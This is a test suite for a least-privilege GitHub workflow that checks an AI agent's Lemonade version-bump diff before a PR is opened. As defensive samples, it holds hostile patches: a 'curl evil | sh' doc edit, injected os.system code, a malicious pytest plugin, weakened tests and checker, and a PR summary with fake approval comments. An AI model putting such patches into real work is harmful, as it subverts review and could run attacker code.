# Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
# SPDX-License-Identifier: MIT
"""The Lemonade bump's changes are checked against main before a PR is opened.

GitHub runs no CI on a PR opened with GITHUB_TOKEN, so the bump workflow checks
its own result. The agent job may only read the repo and hand over a diff. The
verify job, with a read-only token, applies that diff to a fresh main only if
main's ``util/check_lemonade_bump.py`` accepts it, and runs main's pin tests.
The publish job holds the write token, runs only main's standard-library
scripts, and opens the PR. These tests pin that structure, run the real step
scripts in a scratch repo, and feed the checker the patches it must refuse.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = REPO_ROOT / ".github" / "workflows" / "lemonade-version-bump.yml"
CHECKER = REPO_ROOT / "util" / "check_lemonade_bump.py"
RENDER = REPO_ROOT / "util" / "render_lemonade_bump_pr.py"
BUMP_FILES = [
    "src/gaia/version.py",
    "src/gaia/llm/lemonade_embedded.py",
    "src/gaia/installer/lemonade_installer.py",
    "tests/fixtures/lemonade/release_tags.txt",
    "util/check_lemonade_bump.py",
]
GIT_ENV = {
    "GIT_AUTHOR_NAME": "t",
    "GIT_AUTHOR_EMAIL": "t@example.com",
    "GIT_COMMITTER_NAME": "t",
    "GIT_COMMITTER_EMAIL": "t@example.com",
}
CHECKED_JOBS = ("verify", "publish")


@pytest.fixture(scope="module")
def workflow() -> dict:
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))


def _step(job: dict, name: str) -> dict:
    found = [s for s in job["steps"] if s.get("name") == name]
    assert found, f"lemonade-version-bump.yml has no {name!r} step"
    return found[0]


def _names(job: dict) -> list:
    return [s.get("name") for s in job["steps"]]


# --- Structure -------------------------------------------------------------------


def test_each_job_holds_only_the_token_it_needs(workflow):
    jobs = workflow["jobs"]
    assert workflow["permissions"] == {}, "every job must declare its own token"
    assert jobs["bump"]["permissions"] == {
        "contents": "read",
        "pull-requests": "read",
        "issues": "write",
    }
    assert jobs["verify"]["permissions"] == {"contents": "read"}
    assert jobs["publish"]["permissions"] == {
        "contents": "write",
        "pull-requests": "write",
    }
    assert jobs["report"]["permissions"] == {"issues": "write"}


def test_no_checkout_leaves_the_token_in_git_config(workflow):
    jobs = workflow["jobs"]
    for job_id in ("bump", "verify", "publish"):
        checkouts = [
            s
            for s in jobs[job_id]["steps"]
            if (s.get("uses") or "").startswith("actions/checkout@")
        ]
        assert len(checkouts) == 1, job_id
        assert checkouts[0]["with"]["persist-credentials"] is False, job_id
    assert _step(jobs["bump"], "Checkout repository")["with"]["ref"] == "main"
    assert _step(jobs["verify"], "Checkout main")["with"]["ref"] == "main"
    publish = _step(jobs["publish"], "Checkout the main commit verify checked")
    assert publish["with"]["ref"] == "${{ needs.verify.outputs.main_sha }}"
    assert jobs["verify"]["outputs"]["main_sha"] == "${{ steps.main.outputs.sha }}"


def test_the_agent_runs_only_in_the_read_only_job(workflow):
    def agents(job):
        return [
            s for s in job["steps"] if "claude-code-action" in (s.get("uses") or "")
        ]

    jobs = workflow["jobs"]
    assert len(agents(jobs["bump"])) == 1
    for job_id in ("verify", "publish", "report"):
        assert agents(jobs[job_id]) == [], job_id
    prompt = agents(jobs["bump"])[0]["with"]["prompt"]
    for command in ("gh pr create", "gh pr edit", "git push"):
        assert command not in prompt, f"the agent's prompt still runs `{command}`"


def test_the_publish_job_runs_no_code_from_the_bump(workflow):
    for step in workflow["jobs"]["publish"]["steps"]:
        run = step.get("run") or ""
        assert "pip install" not in run and "pytest" not in run, step["name"]
        for line in run.splitlines():
            if re.match(r"\s*python\b", line):
                assert re.match(r"\s*python -I util/[a-z_]+\.py\b", line), line


def test_the_checks_run_only_on_a_packaged_bump_and_in_order(workflow):
    jobs = workflow["jobs"]
    ready = "needs.bump.outputs.ready == 'true'"
    assert jobs["bump"]["outputs"]["ready"] == "${{ steps.package.outputs.ready }}"
    assert _step(jobs["bump"], "Package the bump")["id"] == "package"
    upload = _step(jobs["bump"], "Upload the bump")
    assert upload["if"] == "steps.package.outputs.ready == 'true'"
    assert upload["with"]["if-no-files-found"] == "error"
    assert jobs["verify"]["needs"] == "bump"
    assert jobs["verify"]["if"] == f"success() && {ready}"
    assert sorted(jobs["publish"]["needs"]) == ["bump", "verify"]
    assert jobs["publish"]["if"] == f"success() && {ready}"
    assert sorted(jobs["report"]["needs"]) == ["bump", "publish", "verify"]
    assert jobs["report"]["if"] == (
        "always() && (needs.verify.result == 'failure' "
        "|| needs.publish.result == 'failure')"
    )


@pytest.mark.parametrize(
    "job_id,order",
    [
        (
            "verify",
            [
                "Checkout main",
                "Download the bump",
                "Check and apply the bump",
                "Install GAIA and test tooling",
                "Check the pins with main's tests",
            ],
        ),
        (
            "publish",
            [
                "Checkout the main commit verify checked",
                "Download the bump",
                "Check and apply the bump",
                "Write the PR body",
                "Open the bump PR",
            ],
        ),
    ],
)
def test_every_check_must_pass_before_the_next_step(workflow, job_id, order):
    job = workflow["jobs"][job_id]
    assert [n for n in _names(job) if n in order] == order
    for step in job["steps"]:
        assert (
            "if" not in step
        ), f"{step['name']!r} must run only if all before it passed"
        assert not step.get("continue-on-error"), step["name"]
        run = step.get("run")
        if run:
            lines = run.strip().splitlines()
            assert lines[0] == "set -euo pipefail", step["name"]
            # Only the first line may set shell options, and nothing may swallow a failure.
            later = "\n".join(lines[1:])
            assert not re.search(r"\bset\s+[-+]|\|\||\btrap\b", later), step["name"]


def test_the_pins_are_checked_strictly(workflow):
    step = _step(workflow["jobs"]["verify"], "Check the pins with main's tests")
    assert step["env"]["GAIA_REQUIRE_RELEASE_API"] == "1"
    assert step["env"]["GITHUB_TOKEN"]
    commands = [line.strip() for line in step["run"].splitlines()]
    assert (
        "tests/unit/test_lemonade_download_urls.py::TestEveryReleaseIsPinned \\"
        in commands
    )
    assert "tests/integration/test_lemonade_embeddable_assets.py" in commands
    assert "python util/check_doc_versions.py" in commands


def test_the_pr_body_comes_from_the_template(workflow):
    publish = workflow["jobs"]["publish"]
    write = _step(publish, "Write the PR body")
    assert "python -I util/render_lemonade_bump_pr.py" in write["run"]
    opener = _step(publish, "Open the bump PR")
    assert '--body-file "$RUNNER_TEMP/pr-body.md"' in opener["run"]
    assert '--out "$RUNNER_TEMP/pr-body.md"' in write["run"]


# --- The checker -----------------------------------------------------------------


def _git(repo: Path, *args: str) -> str:
    env = {**os.environ, **GIT_ENV}
    result = subprocess.run(
        ["git", "-c", "core.autocrlf=false", *args],
        cwd=repo,
        env=env,
        capture_output=True,
        text=True,
        encoding="utf-8",
        check=True,
    )
    return result.stdout


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(text.encode("utf-8"))


DOC = (
    "Install Lemonade 2026.42.1 first.\n"
    "It listens on 127.0.0.1:13305 and needs Python 3.10.0.\n"
    "Email needs Lemonade 2026.42.1+.\n"
    "Voice needs Lemonade 2026.42.1 or later.\n"
    "Then run gaia init.\n"
)


@pytest.fixture
def main_repo(tmp_path) -> Path:
    """A scratch "main" holding the files a bump edits, a doc, a test and a config."""
    repo = tmp_path / "main"
    for rel in BUMP_FILES:
        data = (REPO_ROOT / rel).read_bytes().replace(b"\r\n", b"\n")
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        (repo / rel).write_bytes(data)
    _write(repo / "docs" / "install.mdx", DOC)
    _write(
        repo / "tests" / "unit" / "test_pins.py",
        "def test_pin():\n    assert PINNED == PUBLISHED\n",
    )
    _write(repo / "pyproject.toml", "[project]\nname = 'x'\n")
    _git(repo.parent, "init", "-q", "-b", "main", str(repo))
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main")
    return repo


def _edit(repo: Path, rel: str, old: str, new: str) -> None:
    path = repo / rel
    text = path.read_bytes().decode("utf-8")
    assert old in text, f"{old!r} not in {rel}"
    path.write_bytes(text.replace(old, new, 1).encode("utf-8"))


LEGACY_TAIL = (
    '    "v2026.41.1/lemonade.msi": '
    '"cb8753fef41937baedd24dc949ab332d914f537dd597cb62efe54f5448825314",\n'
)


def _honest_bump(repo: Path) -> None:
    _edit(repo, "src/gaia/version.py", '"2026.42.1"', '"2026.43.1"')
    _edit(
        repo,
        "src/gaia/installer/lemonade_installer.py",
        LEGACY_TAIL,
        LEGACY_TAIL + f'    "v2026.42.1/lemonade.msi": "{"a" * 64}",\n',
    )
    _edit(
        repo,
        "src/gaia/llm/lemonade_embedded.py",
        '"lemonade-embeddable-2026.42.1-windows-x64.zip": "6bc9',
        '"lemonade-embeddable-2026.43.1-windows-x64.zip": "6bc9',
    )
    _edit(
        repo,
        "tests/fixtures/lemonade/release_tags.txt",
        "v2026.42.1\n",
        "v2026.42.1\nv2026.43.1\n",
    )
    _edit(repo, "docs/install.mdx", "Lemonade 2026.42.1", "Lemonade 2026.43.1")


def _patch(repo: Path, tmp_path: Path, untracked_too: bool = False) -> Path:
    """Diff the edits into a patch, as the agent job does, and reset *repo* to main."""
    if untracked_too:
        _git(repo, "add", "-A")
        diff = _git(repo, "diff", "--binary", "--cached")
        _git(repo, "reset", "-q")
    else:
        diff = _git(repo, "diff", "--binary")
    patch = tmp_path / "bump.patch"
    patch.write_bytes(diff.encode("utf-8"))
    _git(repo, "checkout", "-q", "--", ".")
    _git(repo, "clean", "-qfd")
    return patch


def _check(repo: Path, patch: Path, target: str = "2026.43.1"):
    command = [sys.executable, "-I", str(CHECKER), "--repo", str(repo)]
    command += ["--patch", str(patch), "--target", target]
    return subprocess.run(
        command, capture_output=True, text=True, encoding="utf-8", check=False
    )


def test_an_honest_bump_is_applied(main_repo, tmp_path):
    _honest_bump(main_repo)
    result = _check(main_repo, _patch(main_repo, tmp_path))
    assert result.returncode == 0, result.stderr
    version = (main_repo / "src/gaia/version.py").read_bytes().decode("utf-8")
    assert '"2026.43.1"' in version
    assert _git(main_repo, "diff", "--cached", "--name-only").split() == [
        "docs/install.mdx",
        "src/gaia/installer/lemonade_installer.py",
        "src/gaia/llm/lemonade_embedded.py",
        "src/gaia/version.py",
        "tests/fixtures/lemonade/release_tags.txt",
    ]


def _wrong_digest(repo: Path) -> None:
    _edit(
        repo,
        "src/gaia/installer/lemonade_installer.py",
        '"v2026.42.1/lemonade.msi": "94ec399d',
        '"v2026.42.1/lemonade.msi": "00ec399d',
    )


INSTALLER = "src/gaia/installer/lemonade_installer.py"

# attack -> (how the agent's patch does it, why the checker must refuse it)
MALICIOUS = {
    "an edited test": (
        lambda r: (
            _wrong_digest(r),
            _edit(r, "tests/unit/test_pins.py", "PINNED == PUBLISHED", "True"),
        ),
        "never edits tests/unit/test_pins.py",
    ),
    "a new pytest.ini": (
        lambda r: (
            _wrong_digest(r),
            _write(r / "pytest.ini", "[pytest]\naddopts = -p evil\n"),
        ),
        "creates, deletes, renames or re-modes",
    ),
    "an edited config": (
        lambda r: _edit(r, "pyproject.toml", "'x'", "'y'"),
        "never edits pyproject.toml",
    ),
    "an edited checker": (
        lambda r: _edit(r, "util/check_lemonade_bump.py", "return 1", "return 0"),
        "never edits util/check_lemonade_bump.py",
    ),
    "code beside the pins": (
        lambda r: _edit(
            r,
            INSTALLER,
            "INSTALLER_SHA256 = {",
            "__import__('os').system('true')\nINSTALLER_SHA256 = {",
        ),
        "changes a line that is not a pin",
    ),
    "a comment beside the pins": (
        lambda r: _edit(r, INSTALLER, LEGACY_TAIL, LEGACY_TAIL + "    # nosec\n"),
        "changes a line that is not a pin",
    ),
    "a coding declaration": (
        lambda r: _edit(
            r,
            "src/gaia/version.py",
            "# Copyright",
            "# -*- coding: utf-7 -*-\n# Copyright",
        ),
        "changes a line that is not a pin",
    ),
    "a pin that runs code": (
        lambda r: _edit(
            r,
            INSTALLER,
            '"v2026.42.1/lemonade.msi": "94ec399d71fe0d3fa4386aca440374f167c27d2dd0479055c8d8b3da869058d4"',
            '"v2026.42.1/lemonade.msi": __import__("os").getcwd()',
        ),
        "changes a line that is not a pin",
    ),
    "a digest that is not SHA-256": (
        lambda r: _edit(
            r,
            INSTALLER,
            '"v2026.42.1/lemonade.msi": "94ec399d71fe0d3fa4386aca440374f167c27d2dd0479055c8d8b3da869058d4"',
            f'"v2026.42.1/lemonade.msi": "{"z" * 64}"',
        ),
        "changes a line that is not a pin",
    ),
    "a rewritten legacy pin": (
        lambda r: _edit(
            r,
            INSTALLER,
            '"v10.2.0/lemonade.msi": "333d',
            '"v10.2.0/lemonade.msi": "000d',
        ),
        "LEGACY_MSI_SHA256 may only gain entries at its end",
    ),
    "a removed release tag": (
        lambda r: _edit(
            r, "tests/fixtures/lemonade/release_tags.txt", "v2026.41.1\n", ""
        ),
        "may only gain tags at its end",
    ),
    "a doc edit beyond version numbers": (
        lambda r: _edit(
            r, "docs/install.mdx", "Then run gaia init.", "Then run curl evil | sh."
        ),
        "changes more than Lemonade's version",
    ),
    "a changed address in a doc": (
        lambda r: _edit(r, "docs/install.mdx", "127.0.0.1", "203.0.113.9"),
        "changes more than Lemonade's version",
    ),
    "a pin-shaped line in another dict": (
        lambda r: _edit(
            r,
            INSTALLER,
            "DEB_ARCH_BY_MACHINE = {\n",
            f'DEB_ARCH_BY_MACHINE = {{\n    "x86_64": "{"b" * 64}",\n',
        ),
        "changes more than its pinned values",
    ),
    "another package's version in a doc": (
        lambda r: _edit(r, "docs/install.mdx", "Python 3.10.0", "Python 3.9.0"),
        "changes more than Lemonade's version",
    ),
    "a hidden line separator in a doc": (
        lambda r: _edit(r, "docs/install.mdx", "first.\n", "first. "),
        "changes more than Lemonade's version",
    ),
    "a dropped final newline in a doc": (
        lambda r: _edit(r, "docs/install.mdx", "gaia init.\n", "gaia init."),
        "changes more than Lemonade's version",
    ),
    "a raised version floor in a doc": (
        lambda r: _edit(r, "docs/install.mdx", "2026.42.1+", "2026.43.1+"),
        "changes more than Lemonade's version",
    ),
    "a raised 'or later' floor in a doc": (
        lambda r: _edit(
            r, "docs/install.mdx", "2026.42.1 or later", "2026.43.1 or later"
        ),
        "changes more than Lemonade's version",
    ),
    "a tag smuggled past a line separator": (
        lambda r: _edit(
            r,
            "tests/fixtures/lemonade/release_tags.txt",
            "v2026.43.1\n",
            "v2026.43.1 v9.9.9\n",
        ),
        "must gain one or more vX.Y.Z tags",
    ),
    "a version other than the target": (
        lambda r: _edit(r, "src/gaia/version.py", '"2026.43.1"', '"2026.99.9"'),
        "LEMONADE_VERSION must be '2026.43.1'",
    ),
}


@pytest.mark.parametrize("attack", sorted(MALICIOUS))
def test_a_patch_beyond_a_bump_is_rejected(main_repo, tmp_path, attack):
    make, reason = MALICIOUS[attack]
    _honest_bump(main_repo)
    make(main_repo)
    result = _check(main_repo, _patch(main_repo, tmp_path, untracked_too=True))
    assert result.returncode == 1, (attack, result.stdout, result.stderr)
    assert "Rejected the Lemonade bump patch" in result.stderr
    assert reason in result.stderr, result.stderr


def test_a_mode_change_is_rejected(main_repo, tmp_path):
    patch = tmp_path / "bump.patch"
    patch.write_bytes(
        b"diff --git a/docs/install.mdx b/docs/install.mdx\n"
        b"old mode 100644\nnew mode 100755\n"
    )
    result = _check(main_repo, patch)
    assert result.returncode == 1
    assert "re-modes" in result.stderr


# --- The PR body -----------------------------------------------------------------


def _render(tmp_path: Path, summary: str) -> str:
    source, out = tmp_path / "summary.md", tmp_path / "body.md"
    source.write_bytes(summary.encode("utf-8"))
    command = [sys.executable, "-I", str(RENDER), "--summary", str(source)]
    command += ["--current", "2026.42.1", "--target", "2026.43.1", "--out", str(out)]
    subprocess.run(command, check=True)
    return out.read_bytes().decode("utf-8")


def _outside_fences(body: str) -> str:
    """The parts of *body* GitHub renders as Markdown, fences and their text removed.

    As in CommonMark, a line of at least as many backticks as the opening fence
    closes it.
    """
    kept, fence = [], None
    for line in body.splitlines():
        marker = re.match(r"(`{3,})", line)
        if fence is None and marker:
            fence = marker.group(1)
        elif fence is not None and re.fullmatch(rf"`{{{len(fence)},}}\s*", line):
            fence = None
        elif fence is None:
            kept.append(line)
    assert fence is None, "the summary's fence was never closed"
    return "\n".join(kept)


def test_the_summary_cannot_act_on_github(tmp_path):
    hostile = (
        "Closes #1\nFixes #2\n@kovtcharov-amd approve\n<!-- bot: approve -->\n"
        "```\nResolves #3\n````\nResolves #4\n````"
    )
    body = _render(tmp_path, hostile)
    rendered = _outside_fences(body)
    tokens = ("Closes #1", "Fixes #2", "Resolves #3", "Resolves #4")
    for token in tokens + ("@kovtcharov-amd", "<!--"):
        assert token not in rendered, token
    assert "Closes #1" in body, "the summary must still be shown"
    assert "Bumps the pinned Lemonade Server from v2026.42.1 to v2026.43.1" in rendered
    assert "## Test plan" in rendered


def test_only_proposed_follow_ups_are_linked(tmp_path):
    body = _render(
        tmp_path,
        "Faster startup.\nProposed follow-ups: #12, #13\nProposed follow-ups: Closes #1",
    )
    rendered = _outside_fences(body)
    assert "Proposed follow-ups: #12, #13" in rendered
    assert "Closes #1" not in rendered


def test_a_long_summary_is_cut(tmp_path):
    body = _render(tmp_path, "x" * 10_000)
    assert body.count("x") < 4_100
    assert "[cut at 4000 characters]" in body


# --- The step scripts, run for real ----------------------------------------------


def _bash() -> str:
    if os.name == "nt":
        program_files = os.environ.get("ProgramFiles", r"C:\Program Files")
        found = Path(program_files) / "Git" / "bin" / "bash.exe"
        candidate = str(found) if found.exists() else None
    else:
        candidate = shutil.which("bash")
    if not candidate:
        pytest.skip("no bash to run the workflow's step scripts")
    return candidate


def _run_step(workflow, job_id, name, cwd: Path, env: dict, tmp_path: Path):
    step = _step(workflow["jobs"][job_id], name)
    assert "${{" not in step["run"], f"{name!r} must read inputs from env"
    output = tmp_path / "github_output"
    output.write_bytes(b"")
    full_env = {
        **os.environ,
        **GIT_ENV,
        "GITHUB_OUTPUT": output.as_posix(),
        "GITHUB_STEP_SUMMARY": (tmp_path / "summary").as_posix(),
        "RUNNER_TEMP": tmp_path.as_posix(),
        "PATH": os.pathsep.join([str(Path(sys.executable).parent), os.environ["PATH"]]),
        **env,
    }
    result = subprocess.run(
        [_bash(), "-c", step["run"]],
        cwd=cwd,
        env=full_env,
        capture_output=True,
        text=True,
        encoding="utf-8",
        check=False,
    )
    return result, output.read_bytes().decode("utf-8")


def _package(workflow, repo, base, tmp_path, body):
    pr_body = tmp_path / "pr-body.md"
    if body is not None:
        _write(pr_body, body)
    out = tmp_path / "out"
    env = {
        "BRANCH": "deps/lemonade-2026.43.1",
        "BASE": base,
        "PR_BODY": pr_body.as_posix(),
        "OUT": out.as_posix(),
    }
    result, outputs = _run_step(
        workflow, "bump", "Package the bump", repo, env, tmp_path
    )
    return result, outputs, out


def _base(repo: Path) -> str:
    return _git(repo, "rev-parse", "HEAD").strip()


def test_a_stopped_agent_packages_nothing(workflow, main_repo, tmp_path):
    result, outputs, out = _package(
        workflow, main_repo, _base(main_repo), tmp_path, None
    )
    assert result.returncode == 0, result.stderr
    assert "ready=false" in outputs and "ready=true" not in outputs
    assert not out.exists()


def test_a_commit_without_a_summary_fails(workflow, main_repo, tmp_path):
    base = _base(main_repo)
    _git(main_repo, "checkout", "-q", "-b", "deps/lemonade-2026.43.1")
    _honest_bump(main_repo)
    _git(main_repo, "commit", "-qam", "bump")
    result, outputs, _ = _package(workflow, main_repo, base, tmp_path, None)
    assert result.returncode != 0
    assert "ready=true" not in outputs


def test_a_branch_without_a_commit_fails(workflow, main_repo, tmp_path):
    _git(main_repo, "branch", "deps/lemonade-2026.43.1")
    result, outputs, _ = _package(
        workflow, main_repo, _base(main_repo), tmp_path, "summary"
    )
    assert result.returncode != 0
    assert "ready=true" not in outputs


def test_a_finished_bump_is_packaged_as_a_diff(workflow, main_repo, tmp_path):
    base = _base(main_repo)
    _git(main_repo, "checkout", "-q", "-b", "deps/lemonade-2026.43.1")
    _honest_bump(main_repo)
    _git(main_repo, "commit", "-qam", "bump")
    _write(main_repo / "pytest.ini", "[pytest]\n")
    result, outputs, out = _package(workflow, main_repo, base, tmp_path, "Bumps it.")
    assert result.returncode == 0, result.stderr
    assert "ready=true" in outputs
    assert (out / "pr-body.md").read_bytes() == b"Bumps it."
    patch = (out / "bump.patch").read_bytes().decode("utf-8")
    assert '+LEMONADE_VERSION = "2026.43.1"' in patch
    assert "pytest.ini" not in patch, "an untracked file must not travel"


def _apply_step(workflow, job_id, repo, patch: Path, tmp_path):
    env = {"BUMP": patch.parent.as_posix(), "TARGET": "2026.43.1"}
    step = "Check and apply the bump"
    return _run_step(workflow, job_id, step, repo, env, tmp_path)[0]


@pytest.mark.parametrize("job_id", CHECKED_JOBS)
@pytest.mark.parametrize("attack", ["an edited test", "a new pytest.ini"])
def test_the_apply_step_refuses_a_malicious_bump(
    workflow, main_repo, tmp_path, job_id, attack
):
    _honest_bump(main_repo)
    MALICIOUS[attack][0](main_repo)
    patch = _patch(main_repo, tmp_path, untracked_too=True)
    result = _apply_step(workflow, job_id, main_repo, patch, tmp_path)
    assert result.returncode != 0
    assert "Rejected the Lemonade bump patch" in result.stderr
    assert not (main_repo / "pytest.ini").exists()
    test_file = (main_repo / "tests/unit/test_pins.py").read_bytes()
    assert b"assert PINNED == PUBLISHED" in test_file


@pytest.mark.parametrize("job_id", CHECKED_JOBS)
def test_the_apply_step_applies_an_honest_bump(workflow, main_repo, tmp_path, job_id):
    _honest_bump(main_repo)
    patch = _patch(main_repo, tmp_path)
    result = _apply_step(workflow, job_id, main_repo, patch, tmp_path)
    assert result.returncode == 0, result.stderr
    version = (main_repo / "src/gaia/version.py").read_bytes()
    assert b'"2026.43.1"' in version


def test_the_publish_job_writes_the_templated_body(workflow, tmp_path):
    bump = tmp_path / "bump"
    _write(bump / "pr-body.md", "Closes #9 and more.")
    env = {"BUMP": bump.as_posix(), "CURRENT": "2026.42.1", "TARGET": "2026.43.1"}
    result, _ = _run_step(
        workflow, "publish", "Write the PR body", REPO_ROOT, env, tmp_path
    )
    assert result.returncode == 0, result.stderr
    body = (tmp_path / "pr-body.md").read_bytes().decode("utf-8")
    assert "Closes #9" not in _outside_fences(body)
    assert "## Test plan" in body
